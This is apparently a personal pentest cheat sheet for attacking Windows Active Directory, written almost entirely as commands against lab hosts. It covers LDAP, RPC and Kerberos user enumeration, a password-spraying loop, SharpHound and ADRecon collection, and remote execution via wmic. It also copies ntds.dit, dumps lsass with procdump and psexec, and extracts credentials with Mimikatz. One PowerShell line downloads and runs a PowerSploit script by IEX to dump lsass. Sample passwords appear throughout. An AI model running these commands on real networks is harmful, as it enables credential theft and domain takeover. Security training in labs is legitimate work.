<H1>Exploit AD</H1>

**Summery:** 

- [Pentest](#pentest)
  - [Information Gathering](#information-gathering)
  - [File Upload](#file-upload)
  - [Domain to Hostfile](#domain-to-hostfile)
- [Post exploit](#post-exploit)
    - [ADRecon](#adrecon)
    - [SharpHound && BloodHound](#sharphound--bloodhound)
  - [Command](#command)
  - [Get domain name](#get-domain-name)
    - [Remote](#remote)
  - [DC list](#dc-list)
  - [Domain Scan](#domain-scan)
  - [Dump password](#dump-password)
    - [Recover password (Attacker machine)](#recover-password-attacker-machine)
  - [SharpHound](#sharphound)
  - [BloodHound](#bloodhound)
    - [csv To json](#csv-to-json)


# Pentest 

## Information Gathering 

Get a list of username form domain [link](https://hunter.io/)

Scan: 

    nmap -F pentest.lab

## Enumeration

## Enum users

### LDAP enum users

    nmap --script=ldap-search 10.10.10.161 -p 389 --script-args ldap.maxobjects=-1 > userPrincipalName | grep 'userPrincipalName:' | awk '{print $3}' | cut -d @ -f 1 > ldapUser

or

    ldapsearch -h 10.10.10.161 -p 389 -x -LLL -b "dc=htb,dc=local" | grep 'userPrincipalName:' | awk '{print $2}' | cut -d @ -f 1 > ldapUse

### RPC enum users

    rpcclient -U "" -N 10.10.10.161 -c getdompwinfo

    rpcclient -U "" -N 10.10.10.161 -c enumdomusers | awk -F '[][]' '{print $2}' > userRpc

    rpcdump.py 10.10.10.161


### kerberos enum users

    cat userRpc ldapUser | sort | uniq > AllUser

    kerbrute userenum -d htb.local --dc 10.10.10.161 AllUser | grep "VALID USERNAME:" | awk '{print $7}'> kerbUser
    

## Password spraying 

```bash
rm spraying
for username in $(cat kerbUser | cut -d @ -f 1 | grep -x '.\{7,30\}');do
    echo "$username:$username" >> spraying
done
```

kerbrute bruteforce -d htb.local --dc 10.10.10.161 spraying

## Domain to Hostfile 
Path: `C:\Windows\System32\Drivers\etc\hosts`

Data: `192.168.1.81   pentest.lab`

# Post exploit
### ADRecon
*Requist user and password !* 

Commands:
```powershell
powershell -ex bypass
Import-Module .\ADRecon.ps1

.\ADRecon.ps1 -Protocol LDAP -DomainController 192.168.1.81 -Credential pentest.lab\bob


.\ADRecon.ps1 -Protocol ADWS -DomainController 192.168.1.81 -Credential pentest.lab\bob -Collect Domian, DCs
```

[Tools link (Git)](https://github.com/sense-of-security/ADRecon)


### SharpHound && BloodHound
```powershell
SharpHound.exe --Domain pentest.lab --DomainController 192.168.1.81 --LdapUser bob --LdapPass Summer19 -c All

SharpHound.exe --Domain pentest.lab --DomainController 192.168.1.81 --LdapUser bob --LdapPass Summer19

SharpHound.exe --CollectionMethod Session --Stealth
```
## Command  

    net user \<DOMAIN>

    dir \\<IP_ADDRESSS>\sysvol

    copy \\<IP_ADDRESSS>\c$\temp\ntds.dit C:\temp

## Get domain name 

    wmic computersystem get domain
    or
    gpresult /R


### Remote

Remote command  

    wmic /node:dc /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "cmd /c systeminfo"

    runas.exe /netonly /user:<DOMAIN>\<USERNAME> cmd.exe

## DC list 
    nltest /dclist:pentest.lab
## Domain Scan 

    1..254 | % { nslookup 192.168.1."$_"}

## Dump password
> Procdump
    Procdump.exe -accepteula -ma lsass.exe  

> Psexec

FileURL: https://live.sysinternals.com/psexec.exe

> Dump lsass
> 
    psexec.exe -i -s lsass.exe

### Recover password (Attacker machine)

Mimikatz.exe

        Mimikatz "sekurlsa::minidump lsass.dmp"
        sekurlsa::LogonPasswords

vol.exe

    set plugin=C:\Users\Admin\Desktop\My doc\sysExec\plugin
    volatility --plugins=%plugin%/mimikatz.pyâ€” profile=Win7SP0x86 -f halomar.dmp mimikatz

    powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump"

> Source file 
> https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1



    https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf





## SharpHound


## BloodHound

Admin password 

    sudo systemctl start noe4j
    bloodhound

    http://localhost:7474

        BloodHound 
        35cgLuH4UgnvATFBxR5fUr2E

> csvtojson
    ./csvtojson.sh /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/Computers.csv 

/tmp/csv-to-json-converter $ ./csvtojson.sh /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/Computers.csv


### csv To json
    git clone https://github.com/satwik77/csv-to-json-converter.git
    
    csvtojson="/tmp/csv-to-json-converter/csvtojson.sh"

    cd /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/
    mkdir out
    for f in *.csv; do echo "Processing $f file.. =>  $f.json" && $csvtojson $f > out/$f.json; done